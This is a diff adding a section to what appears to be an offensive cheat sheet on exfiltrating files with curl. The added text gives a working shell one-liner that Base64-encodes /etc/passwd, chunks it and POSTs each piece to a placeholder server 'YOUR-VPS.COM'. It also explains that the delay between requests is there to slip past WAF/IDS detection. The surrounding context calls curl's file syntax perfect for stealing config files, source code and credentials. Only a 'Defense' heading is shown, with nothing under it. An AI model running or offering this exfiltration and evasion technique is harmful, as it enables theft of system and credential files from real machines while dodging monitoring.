@@ -37,6 +37,26 @@ The file contents are sent to your server in the POST request body.
 - ⚡️ The `@` syntax in curl tells it to read a local file instead of sending raw text.
 - ⚡️ Perfect for exfiltrating sensitive files (config files, source code, credentials) over HTTP in a single request.
 
+## Exfiltrating Files via Base64 + Chunked Requests
+Sometimes servers or firewalls block direct file leaks.
+A sneaky trick is to encode files in Base64 and send them in small chunks to bypass restrictions.
+
+💻 One-liner:
+```
+i=0; base64 /etc/passwd | fold -w 60 | \
+while read -r line; do \
+  curl -s -X POST -d "$line" http://YOUR-VPS.COM/chunk$i; \
+  i=$((i+1)); \
+  sleep 0.5; \
+done
+```
+
+## 🔎 How it works: 
+1️⃣ Encodes /etc/passwd into Base64   
+2️⃣ Splits into 60-char chunks   
+3️⃣ Sends each chunk via POST requests   
+4️⃣ Adds delay to avoid WAF / IDS detection   
+
 ---
 
 ## 🛡 Defense
